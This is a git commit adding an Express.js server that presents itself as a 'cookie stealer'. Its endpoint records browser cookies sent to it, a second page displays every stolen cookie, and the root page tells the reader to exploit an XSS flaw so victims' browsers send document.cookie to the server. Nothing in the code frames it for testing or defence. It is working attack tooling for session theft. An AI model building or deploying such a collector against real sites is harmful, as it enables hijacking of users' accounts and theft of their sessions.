a2e2c0a58fd6e446d7c17328c25877ab2e30f6ef
Nisaruj <nisaruj@hotmail.com>
2018-10-02 10:54:47 +0700

    Project init

---
+++ index.js
@@ -0,0 +1,24 @@
+const express = require('express')
+const app = express()
+const port = process.env.PORT | 3000;
+cookies = '';
+
+app.get('/', (req, res) => {
+    res.setHeader('X-XSS-Protection', '0')
+    res.send('<pre>This is cookie stealer!\nUsage: Using XSS vulnerability to force user to request "http://this_domain/stealcookie?c="+document.cookie\nSee the results at <a href="/cookies">Cookies</a>></pre>');
+    console.log(req.query.lang);
+})
+
+//View stole cookies
+app.get('/cookies', (req, res) => {
+    console.log(cookies)
+    res.send(cookies);
+})
+
+//Stole cookie 
+app.get('/stealcookie', (req, res) => {
+    res.setHeader('X-XSS-Protection', '0')
+    cookies += req.query.c.replace("<", "") + "<br><br>----------------------------------------------<br><br>";
+})
+
+app.listen(port, () => console.log(`Example app listening on port ${port}!`))
